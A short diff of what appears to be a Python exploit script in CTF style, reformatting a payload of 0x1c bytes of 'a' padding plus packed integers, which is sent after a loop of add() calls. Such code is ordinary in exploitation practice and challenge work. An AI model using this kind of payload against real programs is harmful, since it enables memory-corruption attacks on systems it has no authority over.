@@ -52,7 +52,8 @@ if __name__ == '__main__':
     rifle = 1 
     for i in range(0x3f):
         add(str(i) , str(i))
-    payload = 0x1c * 'a' + p32(0) + p32(0) + p32(0x100)
+    payload = 0x1c * 'a' + p32(0) 
+    payload += p32(0) + p32(0x100)
 
     message(payload)
 
